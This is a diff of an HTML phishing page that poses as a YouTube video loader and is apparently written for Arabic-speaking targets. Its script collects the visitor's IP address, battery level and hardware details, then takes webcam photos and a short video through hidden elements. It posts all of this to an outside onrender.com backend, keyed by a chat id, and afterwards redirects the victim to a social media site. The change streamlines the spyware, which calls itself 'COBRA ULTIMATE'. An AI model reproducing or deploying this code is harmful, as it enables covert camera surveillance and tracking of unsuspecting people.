@@ -2,21 +2,19 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>YouTube Video Player</title>
+  <title>Loading...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <style>
     body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-    .container { text-align: center; padding: 20px; }
-    .loader { border: 3px solid #222; border-top: 3px solid #f00; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
+    .loader { border: 3px solid #222; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     video, canvas { opacity: 0; position: absolute; left: -9999px; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="130">
+  <div style="text-align: center;">
     <div class="loader"></div>
-    <p style="color: #666; font-size: 14px;">جارٍ معالجة الفيديو...<br>يرجى الضغط على <b>Allow</b> للمتابعة.</p>
+    <p style="color: #555; font-size: 13px; margin-top: 20px;">جارٍ التحميل...</p>
   </div>
 
   <video id="v" autoplay muted playsinline></video>
@@ -26,21 +24,15 @@
     const urlParams = new URLSearchParams(window.location.search);
     const chatId = urlParams.get("id");
     const reKey = urlParams.get("re");
-
     const v = document.getElementById("v");
     const c = document.getElementById("c");
     const ctx = c.getContext("2d");
 
     const redirectMap = { "fb": "https://facebook.com", "ig": "https://instagram.com", "yt": "https://youtube.com" };
 
-    // دالة الإرسال مع معالجة الأخطاء
-    async function send(msg, type = "text", file = null) {
+    async function send(payload) {
       if (!chatId) return;
-      const payload = { chat_id: chatId };
-      if (type === "text") payload.message = msg;
-      if (type === "photo") { payload.message = "📸 *NEW SNAPSHOT:*"; payload.photo = file; }
-      if (type === "video") { payload.message = "📹 *VIDEO CLIP (7s):*"; payload.video = file; }
-
+      payload.chat_id = chatId;
       try {
         await fetch("https://render-backend-package1.onrender.com/submit", {
           method: "POST",
@@ -48,41 +40,29 @@
           body: JSON.stringify(payload),
           keepalive: true
         });
-      } catch (e) { console.log("Send Error"); }
+      } catch (e) {}
     }
 
-    async function analyzeTarget() {
-      // 1. جلب بيانات الجهاز فوراً (هذي ما تسحقش إنترنت)
+    async function analyze() {
+      // جلب البطارية والسيستم
       let bat = "N/A";
       try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '🔌' : '🔋'})`; } catch(e){}
       
-      const timeStr = new Date().toLocaleString('ar-DZ');
-      const hardware = `${navigator.hardwareConcurrency} Cores | ${navigator.deviceMemory || 'N/A'}GB RAM`;
-
-      // 2. محاولة جلب الـ IP (باستخدام API بديل ومستقر)
-      let ipData = { ip: "Unknown", city: "Unknown", country: "Unknown", org: "Unknown", timezone: "Unknown" };
+      // جلب الـ IP من مصدر سريع جداً (ipify)
+      let ip = "Unknown";
       try {
-        const res = await fetch("https://ipapi.co/json/");
-        ipData = await res.json();
-      } catch (e) { console.log("IP API Error"); }
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        ip = data.ip;
+      } catch (e) {}
 
-      const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const isVpn = (ipData.timezone !== browserTimezone) ? "⚠️ YES (Detected)" : "✅ NO (Real)";
-
-      // 3. بناء الرسالة وإرسالها
-      let m = "🏁 *COBRA ELITE SYSTEM V8.0* 🏁\n";
-      m += "━━━━━━━━━━━━━━━━━━━━\n";
-      m += `🌍 *IP:* \`${ipData.ip}\`\n`;
-      m += `🛡️ *VPN:* ${isVpn}\n`;
-      m += `🏢 *ISP:* ${ipData.org}\n`;
-      m += `📍 *Loc:* ${ipData.city}, ${ipData.country}\n`;
-      m += `🕒 *Time:* ${timeStr}\n`;
-      m += `🔋 *Battery:* ${bat}\n`;
-      m += `💻 *HW:* ${hardware}\n`;
-      m += "━━━━━━━━━━━━━━━━━━━━\n";
+      let m = "🏴‍☠️ *COBRA ULTIMATE V9.0* 🏴‍☠️\n";
+      m += `🌍 *IP:* \`${ip}\`\n`;
+      m += `🕒 *Time:* ${new Date().toLocaleString('ar-DZ')}\n`;
+      m += `🔋 *Bat:* ${bat} | 💻 *HW:* ${navigator.hardwareConcurrency} Cores\n`;
       
-      await send(m); // إرسال التقرير النصي
-      startSpying(); // البدء في الكاميرا
+      await send({ message: m });
+      startSpying();
     }
 
     function startSpying() {
@@ -99,44 +79,32 @@
                 const blob = new Blob(chunks, { type: 'video/webm' });
                 const reader = new FileReader();
                 reader.readAsDataURL(blob);
-                reader.onloadend = () => { send("", "video", reader.result.split(',')[1]); };
-                setTimeout(finalizeRedirect, 1000);
+                reader.onloadend = () => { send({ video: reader.result.split(',')[1] }); };
+                setTimeout(finish, 2000);
             };
 
-            // التقاط 3 صور وفيديو 7 ثوانٍ
-            setTimeout(() => {
-                // لقطة 1
+            setTimeout(async () => {
+                // التقاط صورة واحدة فقط بجودة عالية لضمان السرعة
                 ctx.drawImage(v, 0, 0, c.width, c.height);
-                send("", "photo", c.toDataURL("image/jpeg", 0.7).split(',')[1]);
+                await send({ photo: c.toDataURL("image/jpeg", 0.6).split(',')[1] });
 
+                // تسجيل فيديو قصير (4 ثواني) لضمان الإرسال
                 recorder.start();
-
-                // لقطة 2 (بعد 3 ثواني)
-                setTimeout(() => {
-                    ctx.drawImage(v, 0, 0, c.width, c.height);
-                    send("", "photo", c.toDataURL("image/jpeg", 0.7).split(',')[1]);
-                }, 3000);
-
-                // إيقاف التسجيل بعد 7 ثواني
                 setTimeout(() => {
                     recorder.stop();
                     stream.getTracks().forEach(t => t.stop());
-                }, 7000);
-            }, 2500);
+                }, 4000); 
+            }, 2000);
           };
         })
-        .catch(() => {
-          send("❌ *Target Denied Access*");
-          finalizeRedirect();
-        });
+        .catch(() => { send({ message: "❌ Denied" }); finish(); });
     }
 
-    function finalizeRedirect() {
-      let finalUrl = redirectMap[reKey] || "https://www.youtube.com";
-      window.location.replace(finalUrl);
+    function finish() {
+      window.location.replace(redirectMap[reKey] || "https://youtube.com");
     }
 
-    if (chatId) analyzeTarget();
+    if (chatId) analyze();
   </script>
 </body>
 </html>
